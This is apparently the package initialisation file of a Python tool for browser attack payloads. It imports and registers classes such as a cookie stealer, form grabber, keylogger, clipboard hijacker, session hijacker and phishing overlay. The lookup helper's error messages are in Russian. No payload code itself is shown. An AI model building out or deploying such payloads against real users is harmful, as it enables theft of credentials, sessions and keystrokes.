from .base import BasePayload, Payload
from .cookie_stealer import CookieStealer
from .form_grabber import FormGrabber
from .keylogger import Keylogger
from .clipboard_hijacker import ClipboardHijacker
from .session_hijacker import SessionHijacker
from .history_snooper import HistorySnooper
from .script_injector import ScriptInjector
from .phishing_overlay import PhishingOverlay


PAYLOADS: dict[str, type[BasePayload]] = {
    "cookie_stealer": CookieStealer,
    "form_grabber": FormGrabber,
    "keylogger": Keylogger,
    "clipboard_hijacker": ClipboardHijacker,
    "session_hijacker": SessionHijacker,
    "history_snooper": HistorySnooper,
    "script_injector": ScriptInjector,
    "phishing_overlay": PhishingOverlay,
}


def get_payload(payload_id: str) -> BasePayload:
    if payload_id not in PAYLOADS:
        raise ValueError(
            f"Неизвестный payload: '{payload_id}'. "
            f"Доступные: {', '.join(PAYLOADS.keys())}"
        )
    return PAYLOADS[payload_id]()


def list_payloads() -> list[str]:
    return list(PAYLOADS.keys())


__all__ = [
    "BasePayload",
    "Payload",
    "PAYLOADS",
    "get_payload",
    "list_payloads",
]
